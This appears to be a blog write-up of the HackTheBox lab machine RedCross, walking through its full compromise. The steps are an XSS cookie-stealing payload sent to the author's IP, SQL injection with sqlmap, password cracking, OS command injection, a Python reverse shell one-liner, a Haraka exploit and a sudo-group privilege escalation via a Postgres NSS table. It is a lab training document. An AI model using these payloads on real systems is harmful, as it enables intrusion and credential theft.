---
title: "HackTheBox Write-up: RedCross"
date: 2023-02-20
description: "My write-up for the HackTheBox box named RedCross"
summary: "My write-up for the HackTheBox box named RedCross"
tags: ["htb", "writeup", "redcross"]
---


This is my write-up for the HackTheBox Machine named RedCross. As usual, a large thanks to the creators of the machine who have put a lot of effort into it, and allowed me and many others to learn a tremendous amount.

Let's get straight into it!

## Write-up

A quick top 10000 TCP port scan reveals the following ports as open:

```c {hl_lines=[1]}
$ nmap 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-14 13:51 AEDT
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.37s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

As we have a HTTPS server running, we can use sslscan to extract any domain
names used in the ssl certificate:

```c {hl_lines=[1]}
$ sslscan 10.10.10.113
Version: 1.11.12-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 10.10.10.113

Testing SSL server 10.10.10.113 on port 443 using SNI name 10.10.10.113

<-----snip----->

SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  intra.redcross.htb
Issuer:   intra.redcross.htb

Not valid before: Jun  3 19:46:58 2018 GMT
Not valid after:  Feb 27 19:46:58 2021 GMT
```

Great! We can now add `intra.redcross.htb` to our `/etc/hosts` file and map it to `10.10.10.113`. Next, we can visit the webpage and see what we find!

Here, we see a login page, and a link to a contact form. Immediately, we can
think of trying SQL injection in the login form or trying to guess usernames and
passwords. But that would be too easy, so let's look around a bit more. Next we follow the `Contact Me` page.

Here, we see a form which apparently allows us to contact the administrator of
the redcross website. We also notice that the footer of the website says `eb
messaging system 0.3b`. The most likely vulnerability in a page like this is a
Cross Site Scripting (XSS) vulnerability, where if the administrator views our
submitted messages, we may be able to steal their session token.

So let's try submitting the following **XSS payload** in all the fields in the
contact form (including request title, details, and contact phone):

```html
<img src=x onerror=this.src='http://10.10.12.83:8081/?c='+document.cookie>
```

Note that my allocated IP address in the hackthebox network is `10.10.12.83`, and
we are using an image tag to make a request to port `8081` on my machine with any cookies found in the browser's cookie jar. Only cookies without the `httpOnly` flag can be retrieved using this attack.

After a few tries, we notice that if we submit a XSS payload in the details
field, the website complains that we are trying to "do something nasty".
However, if we only include the payload in the contact phone field, the website
doesn't complain.

After a few seconds, we see a **cookie sent to us** from the RedCross machine!

```c {hl_lines=[1]}
$ python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...
10.10.10.113 - - [12/Nov/2018 00:05:08] "GET /?c=PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5;%20LANG=EN_US;%20SINCE=1541941507;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 200 -
```

Thus, it is likely the case that there is a script running on the RedCross
server which is opening our messages in a browser where the user is logged in as
admin.

Great! So we have 5 different cookies that are in the admin's cookie jar
including `PHPSESSID`, `LANG`, `SINCE`, `LIMIT`  and `DOMAIN`. Now, let's use admin's cookie of `PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5` and see if we are logged in as admin. Note that I used the `Cookie Editor` Firefox cookie manager to edit my cookies, and just add the one `PHPSESSID` cookie for now.

Interesting! Straight away, we are logged in as admin, and we see an interesting
error:

```
DEBUG INFO: You have an error in your SQL syntax; check the manual thatcorresponds to your MariaDB server version for the right syntax to use near ''at line 1
```

Another thing we notice is that two of the cookies seem to have names that are
also related to SQL queries i.e. `SINCE` and `LIMIT`. So we add these cookies to
our own browser's cookie jar and reload the page.

Here, we see one input field, and entering a `UserID` of `1` leads us to the
following page: `https://intra.redcross.htb/?o=1&page=app`

OK so now we know that there is an SQL query being performed, and the database
is likely to be MariaDB. Let's setup a request for `SQLMap`:

```c {hl_lines=[1]}
$ cat sqlquery2
GET /?o=1&page=app HTTP/1.1
Host: intra.redcross.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://intra.redcross.htb/?page=app
Cookie: PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5; SINCE=1541941507; LIMIT=10; DOMAIN=adminConnection: close
Upgrade-Insecure-Requests: 1
```

Running `SQLMap` with this request tells us that we have found SQL injection!
Specifically, we find it using the `o` parameter:

```c {hl_lines=[1]}
$ sqlmap -r sqlquery2 -p o
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 372 HTTP(s) requests:
---
Parameter: o (GET)
   Type: boolean-based blind
   Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
   Payload: o=1') RLIKE (SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0x28 END))-- wPRJ&page=app

   Type: error-based
   Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
   Payload: o=1') AND (SELECT 5668 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(5668=5668,1))),0x7171706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xTXu&page=app

   Type: AND/OR time-based blind
   Title: MySQL >= 5.0.12 AND time-based blind
   Payload: o=1') AND SLEEP(5)-- qNHG&page=app

[14:40:53] [INFO] the back-end DBMS is MySQL
```

Unfortunately, trying SQLMap's `--os-shell` flag didn't work, likely because the
database server does not have rights to write a file on the server. So we look
for sensitive data in the database instead. We find that the main database is
called `redcross`, and it has a table named `users`. We dump this table as follows:

```c {hl_lines=[1]}
$ sqlmap -r sqlquery2 -D redcross -T users --dump
+----+------+------------------------------+----------+--------------------------------------------------------------+
| id | role | mail                         | username | password                                                     |
+----+------+------------------------------+----------+--------------------------------------------------------------+
| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
+----+------+------------------------------+----------+--------------------------------------------------------------+
```

We then crack the hashes we find above as follows:

```c {hl_lines=[1]}
$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
cookiemonster    (?)
guest            (?)
alexss           (?)
```

Great! We now have the credentials `charles:cookiemonster` and `Penelope:alexss`.

I can now login to the `https://intra.redcross.htb/` website with either of these
credentials, but I do not find much of interest. After a while of aimless
wandering, I decided to actually read the messages the users of the application
were sending to each other. Logging in as Charles, I see very interesting messages between different users!

The admin, Charles and Penelope seem to be discussing pop-ups on an admin
webpanel. This likely refers to our XSS vulnerability we found earlier, and many
exploits using the `alert()` function to create pop-ups.

Maybe these discussions are hinting that we also have to access the admin
webpanel where we can see the messages sent in the original Contact form.

Here, I could have used a subdomain brute forcing tool with a wordlist to find
subdomains, but I ended up just guessing the first thing that popped into my
head and it worked: I was able to access a new website at `https://admin.redcross.htb`!

Interesting! We now have another login page!

Unfortunately, trying Penelope's or Charles' credentials on this login page did
not work, and returned the error: `Not enough privileges`. Additionally, we were
unable to crack the admin user's hash from the database. However, I remembered
that we **received the admin user's `PHPSESSID`** only because they had viewed our
XSS payload from the admin panel. So, we set the `PHPSESSID` cookie again to the
same value as the one we used for the `intra` website, and are greeted with the
the actual admin panel!

Now that we are logged in to the admin panel, we look around at what
functionality we have. The first link is for user management, where we can
seemingly add users to the host hosting the web server. The second link is for
managing firewall rules on the host.

Testing out the "add a user" functionality, we create a test user, and are
provided with a password of `BQD0xwJS`. Likely, this is a randomly generated
password. However, where can we use these credentials? Knowing that we already
have administrative logins on both the `intra` and `admin` subdomains, our next
option would be to test out whether these credentials work when logging in with
SSH:

```c {hl_lines=[1,2,4,6]}
$ ssh test@intra.redcross.htb
$ id
uid=2024 gid=1001(associates) groups=1001(associates)
$ pwd
/home/public/src
$ ls -al
total 12
drwxr-xr-x 2 root     root       4096 Jun 10 21:35 .
drwxrwxr-x 3 root     associates 4096 Jun  8 11:11 ..
-rw-r--r-- 1 penelope       1000 2666 Jun 10 22:39 iptctl.c
```

We successfully login as our test user! However, we find that we do not have
permissions to do much at all on the server. We seem to be in some kind of
restricted shell. We don't find many useful things using this shell, although,
we are able to read a world readable file named `ipctl.c` in the `/home/public/src`
folder. Looking inside this file, we see code that looks like it is used for
adding and deleting `iptables` rules:

```c {hl_lines=[1]}
$ cat iptctl.c
/*
Small utility to manage iptables, easily executable from admin.redcross.htb
v0.1 - allow and restrict mode
v0.3 - added check method and interactive mode (still testing!)
*/

int isValidAction(char *action) {
   int a=0;
   char value[10];
   strncpy(value,action,9);
   if(strstr(value,"allow")) a=1;
   if(strstr(value,"restrict")) a=2;
   if(strstr(value,"show")) a=3;
   return a;
}

void cmdAR(char **a, char *action, char *ip){
   a[0]="/sbin/iptables";
   a[1]=action;
   a[2]="INPUT";
   a[3]="-p";
   a[4]="all";
   a[5]="-s";
   a[6]=ip;
   a[7]="-j";
   a[8]="ACCEPT";
   a[9]=NULL;
   return;
}

<-------SNIP------->

   puts("DEBUG: All checks passed... Executing iptables");
   if(isAction==1) cmdAR(args,"-A",inputAddress);
   if(isAction==2) cmdAR(args,"-D",inputAddress);
   if(isAction==3) cmdShow(args);

   child_pid=fork();
   if(child_pid==0) {
      setuid(0);
      execvp(args[0],args); // /sbin/tables is the file, and args are the args
      exit(0);
   } else {
      if(isAction==1) printf("Network access granted to %s\n",inputAddress);
      if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
      if(isAction==3) puts("ERR: Function not available!\n");
   }
}
```

This looks interesting! Maybe this source code is for **network management
functionality provided in the admin panel**! Testing out the functionality
provided to us on the firewall management page on `admin.redcross.htb`, we see the
following **request being sent to the server when adding a new IP**:

```http
POST /pages/actions.php HTTP/1.1
Host: admin.redcross.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin.redcross.htb/?page=firewall
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Cookie: PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5
Connection: close
Upgrade-Insecure-Requests: 1

ip=8.8.8.8&action=Allow+IP
```

The possible vulnerabilities I could think of here would either be a buffer
overflow due to the uses of `strcpy` in the C script, or an OS command injection
vulnerability due to the arguments being passed into the `execvp` function.

After some trial and error, I was able to get **OS command injection** working with
the `ip` parameter and using an action of `deny`:

```http
POST /pages/actions.php HTTP/1.1
Host: admin.redcross.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin.redcross.htb/?page=firewall
Cookie: PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

ip=10.10.10.10+%26%26+ls&id=27&action=deny
```

In the above OS command injection, we use `&&` to execute another command after `/sbin/iptables`.

Now that we have OS command injection, we can try escalate to a proper reverse
shell. The following is code for a python reverse shell where our attacker IP is `10.10.14.227`:

```c
$ python -c 'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.227",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

HTML encoding the above and sending it in the POST request gave us a reverse
shell:

```py
ip=10.10.10.10+%26%26+python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.227",1234))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/bash","-i"])%3b'&id=27&action=deny
```

```c {hl_lines=[1,6]}
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.227] from (UNKNOWN) [10.10.10.113] 55922
bash: cannot set terminal process group (787): Inappropriate ioctl for device
bash: no job control in this shell
www-data@redcross:/var/www/html/admin/pages$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Woot! This time we have a non-restricted shell. Looking for the user flag, I
find `/home/penelope/user.txt` exists, however I cannot open the file as it is
owned by penelope and not world readable. Looking at other interesting files, I
see a lot of passwords in the PHP files used for the admin panel:

```c {hl_lines=[1]}
www-data@redcross:/var/www/html/admin/pages$ grep password * -Hn
actions.php:32:	$sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
actions.php:44:	if(password_verify($pass,$hash) and $role==0){
actions.php:66:	} else if(password_verify($pass,$hash)){
actions.php:95:	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
actions.php:118:	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
login.php:7:echo "Password";
users.php:7:	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
```

It looks like the admin panel uses a `postgres` database running on `localhost`. There is a database with the name `redcross`, and another named `unix`. We also now have the credentials `www:aXwrtUO9_aa&`, `unixusrmgr:dheu%7wjx8B&` and `unixnss:fios@ew023xnw`.

The database name of `unix` and the username of `unixusrmgr` look really odd. Thinking about this a little bit, we also remember that we were able to add unix
users directly from the admin panel, which we were then able to use to SSH onto
the host. Could these unix users be added using a table in a postgres database?

A little bit of googling told me that this was absolutely possible:
http://www.karoltomala.com/blog/?p=869

Wolverine's blog tells us that this can be achieved with a postgres plugin named `libnss-pgsql2`. Additionally, it mentions that this plugin uses two main
configuration files: `/etc/nss-pgsql.conf` and `/etc/nss-pgsql-root.conf`. Looking
for these files, we find that they do exist on our host!

```c {hl_lines=[1]}
www-data@redcross:/etc$ ls -al nss-*
-rw-rw---- 1 root root  540 Jun  8  2018 nss-pgsql-root.conf
-rw-r--r-- 1 root root 1341 Jun  8  2018 nss-pgsql.conf
```

This pretty much confirms the use of the `libnss-pgsql2` plugin for managing unix
users! Let's try looking inside the unix  database and see what we can find. We
can use the `psql` client to talk with postgres. Additionally, from the `nss-pgsql.conf` file and Wolverine's blog, we note that there is a table in the database named `passwd_table`:

```c {hl_lines=[1,3]}
www-data@redcross:/etc$ psql -h 127.0.0.1 -U unixusrmgr -d unix
Password for user unixusrmgr: dheu%7wjx8B&
SELECT * FROM passwd_table;
username           |               passwd               | uid  | gid  | gecos |    homedir        |   shell
-----------------------------+------------------------------------+------+------+-------+----------------+-----------
tricia             | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
test                        | $1$SQgibi6P$.J1YanvF28BzE1LrO1LIY. | 2021 | 1001 |       | /var/jail/home | /bin/bash
(2 rows)
```

Interesting! We see our test  user exists in this table, and that it has a `homedir` of `/var/jail/home`.

With the permissions of `unixusrmgr`, let's see if I can add a user to this table
and give them a `uid` or `gid` of `0`:

```sql
INSERT INTO passwd_table VALUES ('dev', '$1$xyz$cEUv8aN9ehjhMXG/kSFnM1', 2023, 0, '', '/', '/bin/bash');
ERROR:  permission denied for relation passwd_table
```

Unfortunately I could not specify the `uid` of the user I added, but after looking
through `actions.php`, I found that, as `unixusrmgr`, I did have permissions to fill
in the `username`, `passwd`, `gid` and `homedir` fields. The easiest way I could think
of to use this to get root was to simply **set the `gid` of my new user to the ID of
the `sudo` group**, which would give me the permissions to `sudo` to `root`.

We find the ID of the `sudo` group as follows:

```c {hl_lines=[1]}
www-data@redcross:/$ cat /etc/group | grep sudo
sudo:x:27:
```

Next, we can run the following query (after logging in to `psql` as `unixusrmgr`) to add a user with the `gid` of `27`:

```sql
insert into passwd_table (username, passwd, gid, homedir) values ('dev', '$1$xyz$cEUv8aN9ehjhMXG/kSFnM1', 27, '/');
INSERT 0 1
```

Success! Note that I generated the passwd hash of the user using `openssl passwd
-1 -salt xyz password`. Therefore, the above crypt hash is for the password of `password`. Now I can try SSH in as my new user:

```c {hl_lines=[1,5]}
$ ssh dev@intra.redcross.htb
dev@intra.redcross.htb's password:
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

dev@redcross:/$ id
uid=2032(dev) gid=27(sudo) groups=27(sudo)
```

Great! Looks like our user was successfully added and we are in the `sudo` group!
Now we simply sudo su, enter the password of `password`, and get `root.txt`:

```c {hl_lines=[1,10,12]}
dev@redcross:/$ sudo su

We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dev:
root@redcross:/# id
uid=0(root) gid=0(root) groups=0(root)
root@redcross:/# cat ~/root.txt
892a1f4*************************
```

DONE! What an interesting route to root!

## Extra Notes

Looking around with our `www-data` shell, we also see a folder named `haraka` in
penelope's home directory which stands out. Searching for processes with this
name we find:

```c {hl_lines=[1]}
www-data@redcross:/var/www/html/admin/pages$ ps aux | grep haraka
penelope  1306  0.2  4.4 994300 45060 ?        Ssl  10:54   0:01 node /usr/bin/haraka -c /home/penelope/haraka
www-data  5395  0.0  0.0  11112   916 ?        S    11:04   0:00 grep haraka
```

We note that the haraka process runs as the user `penelope`, so if we compromised
the process, we would get the privileges of `penelope`. Doing a little googling, I
found out that haraka is actually a webmail / SMTP server. To confirm it's
listening, we can try look at open ports on the host. Unfortunately, the host
did not have `netstat`, but as it is debian, we have an alternative called ss:

```c {hl_lines=[1,3]}
www-data@redcross:/var/www/html/admin/pages$ netstat -ntlp
bash: netstat: command not found
www-data@redcross:/var/www/html/admin/pages$ ss -ntlp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      32           :21                       :
LISTEN     0      128          :22                       :
LISTEN     0      128          :5432                     :
LISTEN     0      80     127.0.0.1:3306                     :
LISTEN     0      128         :::80                      :::
LISTEN     0      128         :::22                      :::
LISTEN     0      128         :::5432                    :::
LISTEN     0      128         :::443                     :::*
LISTEN     0      128         :::1025                    :::*
```

Interestingly, we don't see any server running on port 25, which is the default
for Haraka and SMTP based services, but we do see that something is listening on
port 1025. We `telnet` to this port to check it out:

```c {hl_lines=[1]}
www-data@redcross:/var/www/html/admin/pages$ telnet 127.0.0.1 1025
telnet 127.0.0.1 1025
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 redcross ESMTP Haraka 2.8.8 ready
```

Great! Looks like Haraka version 2.8.8 is running on this port!

We also find an exploit for this version using searchsploit:

```c {hl_lines=[1]}
$ searchsploit haraka 2.8.
----------------------------------------------------------------------------------
Exploit Title                                     |  Path| (/usr/share/exploitdb/)
----------------------------------------------------------------------------------
Haraka < 2.8.9 - Remote Command Execution         | exploits/linux/remote/41162.py
----------------------------------------------------------------------------------
```

The `41162.py` file is a python script which takes in parameters for the mail
server you are exploiting and the command you want to execute. It should be
noted that the port of the server is specified in the script itself, so we need
to change it from 25 to 1025. Then, we can use a simple python reverse shell
with this exploit to get a shell as penelope. Simply download [rev.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) and `haraka-exploit.py` onto the host and execute the following:

```c
www-data@redcross:/var/www/html/admin/pages$ python haraka-exploit.py -c "python /tmp/rev.py" -t penelope@redcross.htb -m 127.0.0.1
```

And that's how we can get a shell as `penelope`!

Moving on: let's say we have a scenario where we cannot add ourselves to the `sudo` group, but can add ourselves to the root  group. Here, an interesting scenario arises. Being in the `root` group means that we can read the secret `/etc/nss-pgsql-root.conf` file!

```c {hl_lines=[1]}
dev@redcross:/etc$ cat nss-pgsql-root.conf
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);
```

And now we have the root NSS credentials `unixnssroot:30jdsklj4d_3!` With this, we
should be able to edit the `uid` field in the database too, however I'm not sure
what happens when I add another user with the same `uid` as root. Thoughts will
be had...

Finally, I noticed the following python script in root's folder which was the
script that actually opened a browser and executed the XSS payloads we send to
the admin panel:

```py {hl_lines=[1]}
root@redcross:~/bin$ cat redcrxss.py
#!/usr/bin/python2.7
<-----snip----->
url="https://admin.redcross.htb/9a7d3e2c3ffb452b2e40784f77723938/573ba8e9bfd0abd3d69d8395db582a9e.php?"

def launchXSS(xss):
   randomname = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
   temppath = "/root/bin/tmp/"
   fn = temppath+randomname+'.js'
   phantom = "/usr/local/bin/phantomjs"
<-----snip----->
```

The script uses `phantomjs` to execute a headless browser which executes JavaScript.

Thanks to @ompamo for this awesome box!

Hope you enjoyed the write-up!

---

Live and Learn!
